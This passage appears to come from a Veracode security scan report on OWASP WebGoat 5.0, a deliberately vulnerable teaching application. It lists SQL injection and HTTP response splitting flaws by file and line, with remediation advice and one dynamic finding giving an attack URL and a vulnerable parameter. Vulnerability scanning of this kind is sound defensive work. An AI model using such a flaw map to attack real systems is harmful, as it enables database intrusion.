        scope=\"org.owasp.webgoat.lessons.SqlNumericInjection\" functionprototype=\"apache.ecs.Element
        injectableQuery(session.WebSession)\" functionrelativelocation=\"45\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"165\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"SqlStringInjection.java\" line=\"112\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.SqlStringInjection\" functionprototype=\"apache.ecs.Element
        injectableQuery(session.WebSession)\" functionrelativelocation=\"32\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"225\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ThreadSafetyProblem.java\" line=\"103\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.ThreadSafetyProblem\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"53\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"71\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"UpdateProfile.java\" line=\"176\" sourcefilepath=\"org/owasp/webgoat/lessons/RoleBasedAccessControl/\"
        scope=\"org.owasp.webgoat.lessons.RoleBasedAccessControl.UpdateProfile\" functionprototype=\"void
        changeEmployeeProfile(session.WebSession, int, int, session.Employee)\" functionrelativelocation=\"83\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"112\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeUpdate\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeUpdate()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeUpdate() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"UpdateProfile.java\" line=\"248\" sourcefilepath=\"org/owasp/webgoat/lessons/CrossSiteScripting/\"
        scope=\"org.owasp.webgoat.lessons.CrossSiteScripting.UpdateProfile\" functionprototype=\"void
        changeEmployeeProfile(session.WebSession, int, int, session.Employee)\" functionrelativelocation=\"83\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"59\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeUpdate\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeUpdate()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeUpdate() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"UpdateProfile.java\" line=\"295\" sourcefilepath=\"org/owasp/webgoat/lessons/RoleBasedAccessControl/\"
        scope=\"org.owasp.webgoat.lessons.RoleBasedAccessControl.UpdateProfile\" functionprototype=\"void
        createEmployeeProfile(session.WebSession, int, session.Employee)\" functionrelativelocation=\"68\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"139\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeUpdate\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeUpdate()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeUpdate() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"UpdateProfile.java\" line=\"340\" sourcefilepath=\"org/owasp/webgoat/lessons/CrossSiteScripting/\"
        scope=\"org.owasp.webgoat.lessons.CrossSiteScripting.UpdateProfile\" functionprototype=\"void
        createEmployeeProfile(session.WebSession, int, session.Employee)\" functionrelativelocation=\"85\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"258\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from earlier calls
        to javax.servlet.ServletRequest.getParameterValues, javax.servlet.ServletRequest.getParameter,
        java.sql.Statement.executeQuery, and java.sql.PreparedStatement.executeQuery.\r\n\r\nAvoid
        dynamically constructing SQL queries. Instead, use parameterized prepared
        statements to prevent the database from interpreting the contents of bind
        variables as part of the query. Always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/89.html)
        \r\nOWASP (http://www.owasp.org/index.php/SQL_injection) \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\"
        note=\"\" cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"UpdateProfile_i.java\" line=\"64\" sourcefilepath=\"org/owasp/webgoat/lessons/instructor/RoleBasedAccessControl/\"
        scope=\"org.owasp.webgoat.lessons.instructor.RoleBasedAccessControl.UpdateProfile_i\"
        functionprototype=\"void changeEmployeeProfile(session.WebSession, int, int,
        session.Employee)\" functionrelativelocation=\"80\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"17\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable sqlStatement. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewDatabase.java\" line=\"89\" sourcefilepath=\"org/owasp/webgoat/lessons/admin/\"
        scope=\"org.owasp.webgoat.lessons.admin.ViewDatabase\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"60\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"12\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.java\" line=\"118\" sourcefilepath=\"org/owasp/webgoat/lessons/SQLInjection/\"
        scope=\"org.owasp.webgoat.lessons.SQLInjection.ViewProfile\" functionprototype=\"session.Employee
        getEmployeeProfile(session.WebSession, java.lang.String, java.lang.String)\"
        functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"197\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.java\" line=\"178\" sourcefilepath=\"org/owasp/webgoat/lessons/SQLInjection/\"
        scope=\"org.owasp.webgoat.lessons.SQLInjection.ViewProfile\" functionprototype=\"session.Employee
        getEmployeeProfile_BACKUP(session.WebSession, java.lang.String, java.lang.String)\"
        functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"166\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"java.sql.Statement.executeQuery\" description=\"This database query
        contains a SQL injection flaw. The call to java.sql.Statement.executeQuery()
        constructs a dynamic SQL query using a variable derived from user-supplied
        input. An attacker could exploit this flaw to execute arbitrary SQL queries
        against the database. The first argument to executeQuery() contains tainted
        data from the variable query. The tainted data originated from an earlier
        call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid dynamically
        constructing SQL queries. Instead, use parameterized prepared statements to
        prevent the database from interpreting the contents of bind variables as part
        of the query. Always validate user-supplied input to ensure that it conforms
        to the expected format, using centralized data validation routines when possible.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/89.html) \r\nOWASP (http://www.owasp.org/index.php/SQL_injection)
        \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\" note=\"\"
        cweid=\"89\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"19\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WsSqlInjection.java\" line=\"240\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.WsSqlInjection\" functionprototype=\"java.sql.ResultSet
        getResults(java.lang.String)\" functionrelativelocation=\"80\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n</staticflaws>\n<dynamicflaws>\n<flaw
        severity=\"4\" categoryname=\"Improper Neutralization of Special Elements
        used in an SQL Command ('SQL Injection')\" count=\"1\" issueid=\"275\" module=\"dynamic_analysis\"
        type=\"Improper Neutralization of Special Elements used in an SQL Command
        ('SQL Injection')\" description=\"This database query contains a SQL injection
        flaw. The function call constructs a dynamic SQL query using a variable derived
        from user-supplied input. An attacker could exploit this flaw to execute arbitrary
        SQL queries against the database.\r\n\r\nAvoid dynamically constructing SQL
        queries. Instead, use parameterized prepared statements to prevent the database
        from interpreting the contents of bind variables as part of the query. Always
        validate user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible.\r\n\r\n\r\nCWE (http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=89)
        \r\nOWASP (http://www.owasp.org/index.php/SQL_injection) \r\nWASC (http://webappsec.pbworks.com/SQL-Injection)\r\n\r\n\"
        note=\"\" cweid=\"89\" remediationeffort=\"3\" categoryid=\"19\" pcirelated=\"true\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        url=\"http://10.0.4.89:8080/WebGoat/attack\" vuln_parameter=\"id\"/>\n</dynamicflaws>\n</cwe>\n</category>\n</severity>\n<severity
        level=\"3\">\n<category categoryid=\"21\" categoryname=\"CRLF Injection\"
        pcirelated=\"true\">\n<desc>\n<para text=\"The acronym CRLF stands for &quot;Carriage
        Return, Line Feed&quot; and refers to the sequence of characters used to denote
        the end of a line of text.  CRLF injection vulnerabilities occur when data
        enters an application from an untrusted source and is not properly validated
        before being used.  For example, if an attacker is able to inject a CRLF into
        a log file, he could append falsified log entries, thereby misleading administrators
        or cover traces of the attack.  If an attacker is able to inject CRLFs into
        an HTTP response header, he can use this ability to carry out other attacks
        such as cache poisoning.  CRLF vulnerabilities primarily affect data integrity.
        \ \"/>\n</desc>\n<recommendations>\n<para text=\"Apply robust input filtering
        for all user-supplied data, using centralized data validation routines when
        possible.  Use output filters to sanitize all output derived from user-supplied
        input, replacing non-alphanumeric characters with their HTML entity equivalents.\"/>\n</recommendations>\n<cwe
        cweid=\"113\" cwename=\"Improper Neutralization of CRLF Sequences in HTTP
        Headers ('HTTP Response Splitting')\" pcirelated=\"false\">\n<description>\n<text
        text=\"A function call contains an HTTP response splitting flaw.  Writing
        unsanitized user-supplied input into an HTTP header allows an attacker to
        manipulate the HTTP response rendered by the browser, leading to cache poisoning
        and cross-site scripting attacks.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of CRLF Sequences in
        HTTP Headers ('HTTP Response Splitting')\" count=\"1\" issueid=\"10\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.http.HttpServletResponse.sendRedirect\" description=\"This
        call to javax.servlet.http.HttpServletResponse.sendRedirect() contains an
        HTTP response splitting flaw. Writing unsanitized user-supplied input into
        an HTTP header allows an attacker to manipulate the HTTP response rendered
        by the browser, to inject additional headers or an entire response body into
        the response stream. Injecting headers can be used to trick various security
        mechanisms in browsers into allowing XSS style attacks. Injecting entire response
        bodies can not only cause XSS attacks to succeed but may even poison the cache
        of any intermediary proxies between the clients and the application server.
        The first argument to sendRedirect() contains tainted data from the variable
        request.getParameter(). The tainted data originated from an earlier call to
        javax.servlet.ServletRequest.getParameter.\r\n\r\nEscape, encode, or remove
        carriage return and line feed characters from user-supplied data before inclusion
        in HTTP response headers. Whenever possible, use a security library such as
        ESAPI that provides safe versions of addHeader(), etc. that will automatically
        remove unexpected carriage returns and line feeds and can be configured to
        use HTML entity encoding for non-alphanumeric data. Only write custom blacklisting
        code when absolutely necessary. Always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/113.html)
        \r\nOWASP (http://www.owasp.org/index.php/HTTP_Response_Splitting) \r\nWASC
        (http://webappsec.pbworks.com/HTTP-Response-Splitting)\r\n\r\n\" note=\"\"
        cweid=\"113\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"config_jsp.java\" line=\"43\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/ConfManagement/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.ConfManagement.config_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"60\"/>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of CRLF Sequences in
        HTTP Headers ('HTTP Response Splitting')\" count=\"1\" issueid=\"78\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.http.HttpServletResponse.setHeader\" description=\"This
        call to javax.servlet.http.HttpServletResponse.setHeader() contains an HTTP
        response splitting flaw. Writing unsanitized user-supplied input into an HTTP
        header allows an attacker to manipulate the HTTP response rendered by the
        browser, to inject additional headers or an entire response body into the
        response stream. Injecting headers can be used to trick various security mechanisms
        in browsers into allowing XSS style attacks. Injecting entire response bodies
        can not only cause XSS attacks to succeed but may even poison the cache of
        any intermediary proxies between the clients and the application server. The
        second argument to setHeader() contains tainted data from the variable cookie.
        The tainted data originated from an earlier call to javax.servlet.http.HttpServletRequest.getCookies.\r\n\r\nEscape,
        encode, or remove carriage return and line feed characters from user-supplied
        data before inclusion in HTTP response headers. Whenever possible, use a security
        library such as ESAPI that provides safe versions of addHeader(), etc. that
        will automatically remove unexpected carriage returns and line feeds and can
        be configured to use HTML entity encoding for non-alphanumeric data. Only
        write custom blacklisting code when absolutely necessary. Always validate
        user-supplied input to ensure that it conforms to the expected format, using
        centralized data validation routines when possible.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/113.html) \r\nOWASP (http://www.owasp.org/index.php/HTTP_Response_Splitting)
        \r\nWASC (http://webappsec.pbworks.com/HTTP-Response-Splitting)\r\n\r\n\"
        note=\"\" cweid=\"113\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"HttpOnly.java\" line=\"198\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.HttpOnly\" functionprototype=\"void setHttpOnly(session.WebSession)\"
        functionrelativelocation=\"89\"/>\n<flaw severity=\"3\" categoryname=\"Improper
        Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\"
        count=\"1\" issueid=\"204\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.setHeader\"
        description=\"This call to javax.servlet.http.HttpServletResponse.setHeader()
        contains an HTTP response splitting flaw. Writing unsanitized user-supplied
        input into an HTTP header allows an attacker to manipulate the HTTP response
        rendered by the browser, to inject additional headers or an entire response
        body into the response stream. Injecting headers can be used to trick various
        security mechanisms in browsers into allowing XSS style attacks. Injecting
        entire response bodies can not only cause XSS attacks to succeed but may even
        poison the cache of any intermediary proxies between the clients and the application
        server. The second argument to setHeader() contains tainted data from the
        variable cookie. The tainted data originated from an earlier call to javax.servlet.http.HttpServletRequest.getCookies.\r\n\r\nEscape,
        encode, or remove carriage return and line feed characters from user-supplied
        data before inclusion in HTTP response headers. Whenever possible, use a security
        library such as ESAPI that provides safe versions of addHeader(), etc. that
        will automatically remove unexpected carriage returns and line feeds and can
        be configured to use HTML entity encoding for non-alphanumeric data. Only
        write custom blacklisting code when absolutely necessary. Always validate
        user-supplied input to ensure that it conforms to the expected format, using
        centralized data validation routines when possible.\r\n\r\nReferences: \r\nCWE
        (http://cwe.mitre.org/data/definitions/113.html) \r\nOWASP (http://www.owasp.org/index.php/HTTP_Response_Splitting)
        \r\nWASC (http://webappsec.pbworks.com/HTTP-Response-Splitting)\r\n\r\n\"
        note=\"\" cweid=\"113\" remediationeffort=\"2\" exploitLevel=\"1\" categoryid=\"21\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"HttpOnly.java\" line=\"212\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.HttpOnly\" functionprototype=\"void removeHttpOnly(session.WebSession)\"
        functionrelativelocation=\"89\"/>\n<flaw severity=\"3\" categoryname=\"Improper
        Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\"
        count=\"1\" issueid=\"92\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.sendRedirect\"
        description=\"This call to javax.servlet.http.HttpServletResponse.sendRedirect()
        contains an HTTP response splitting flaw. Writing unsanitized user-supplied
        input into an HTTP header allows an attacker to manipulate the HTTP response
        rendered by the browser, to inject additional headers or an entire response
        body into the response stream. Injecting headers can be used to trick various
        security mechanisms in browsers into allowing XSS style attacks. Injecting
        entire response bodies can not only cause XSS attacks to succeed but may even
        poison the cache of any intermediary proxies between the clients and the application
        server. The first argument to sendRedirect() contains tainted data from the
